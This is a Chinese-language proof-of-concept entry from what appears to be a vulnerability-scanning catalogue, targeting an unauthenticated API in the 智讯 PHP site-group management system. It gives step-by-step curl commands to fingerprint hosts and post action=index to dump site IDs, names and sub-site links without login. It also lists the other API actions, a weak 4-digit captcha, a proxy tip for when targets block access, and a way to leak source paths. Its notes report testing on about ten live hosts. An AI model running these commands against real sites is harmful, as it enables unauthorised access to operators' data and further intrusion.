# 智讯网站群管理系统 /api/ 未授权访问（form-urlencoded 传参 + action=index 泄露站点配置）

- **code**: 智讯网站群管理系统-api-未授权访问-form-urlencoded-传参-action-index-泄露站点配置
- **kind**: poc
- **category**: unauthorized
- **component**: 智讯网网址导航系统（自研 PHP 站群程序）
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 实测 10 台主机（203.0.113.33/.151/.63/.194/.45/.189 + 203.0.113.57 + 203.0.113.60 + 203.0.113.56 + 203.0.113.89）× 3 个 Host（example.com/f57ff99.com/example.com）全部未授权可读，共用同一后端数据库。203.0.113.31 返回站点 id=5483 与 16 条分站链接；203.0.113.58 返回站点 id=5481 name 老澳与 16 条分站链接。
- **path**: pocs/智讯网站群管理系统-api-未授权访问-form-urlencoded-传参-action-index-泄露站点配置/poc_zhixun_api.sh
- **tags**: php,站群,未授权,api,form-urlencoded,智讯网
- **created_at**: 2026-09-28T20:10:21.601Z
- **found_by**: vuln-scan

## 描述

自研 PHP 站群/Api 单入口框架。前端用 JSON 提交 /api/，但后端实际读 $_POST——用 JSON body 会静默走到默认分支返回 {"code":200} 且无 result，极易误判为"接口无数据"。改 form-urlencoded 后即可获得完整 result。本 POC 给出指纹识别、入口发现、未授权 action 清单与源码路径泄露点。

## 用法

```
1) 替换 TARGET_IP / TARGET_DOMAIN 为实际目标与其真实 Host（无正确 Host 时源站返回 500）。2) 顺序执行 content 中的命令。3) 命中判据：action=index 返回 JSON 含 result.Sinfo/Linfo。4) 内网/被封时给 curl 加 --socks5 <proxy>，并保留 --resolve DOMAIN:80:IP 以维持 Cookie 域。
```

## 正文

```
# 指纹识别
curl -s -k -H "Host: TARGET_DOMAIN" http://TARGET_IP/ -i | head -20
# 关注：Server: nginx / X-Powered-By: PHP/8.1.7 / x-is-origin: true（重复两次）/ 根路径无正确 Host 时返回 500

# 拿到首页后提取统一 API 入口
curl -s -k -H "Host: TARGET_DOMAIN" http://TARGET_IP/js/common.js | grep -n "url:"
# -> url: "/api/"

# ★ 关键：必须用 form-urlencoded（JSON body 走默认分支，只返回 {"code":200} 无 result）
curl -s -k -H "Host: TARGET_DOMAIN" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -X POST -d 'action=index' http://TARGET_IP/api/

# 未授权即返回全部站点配置与分站列表：
# {"code":200,"result":{"Ainfo":{...},"Sinfo":{"<站点id>":{"id":"","name":""}},
#   "Linfo":{"<站点id>":[{"id":"<线路id>","link":"https://<随机子域>.TARGET_DOMAIN:<端口>",
#                          "jump":"1","change":"/cache/jump/<hash>.html"}]}}}

# 其他已确认的 action（同一入口）：
#   action=safe     -> {"result":{"safe":1}}  站点是否启用安全码
#   action=index    -> 站点/分组/线路全量数据（未授权）
#   action=login    -> 登录（form: userid/passwd/safe），验证码 GET /code.php（4 位纯数字）
#   action=reg      -> 注册（userid/passwd/passwd1/inherit/safe）
#   action=find     -> 找回密码（email 参数），存在变量未定义 bug（源码路径泄露）
#   action=root_*   -> 后台功能（未登录返回 {"code":151}）
# 后台入口：/root/<uid>/   菜单：网站列表/分组/用户/风格/日志/基本设置

# 源码路径泄露（find 接口触发 PHP 错误）：
# /home/wwwroot/main/application/Api/<action>.php
# /home/wwwroot/main/application/Common/{Base.php,Mysql.php}
# /home/wwwroot/main/public/example.com
# 说明 action 名 == Api/<action>.php 文件名，可作为 action 枚举线索
```
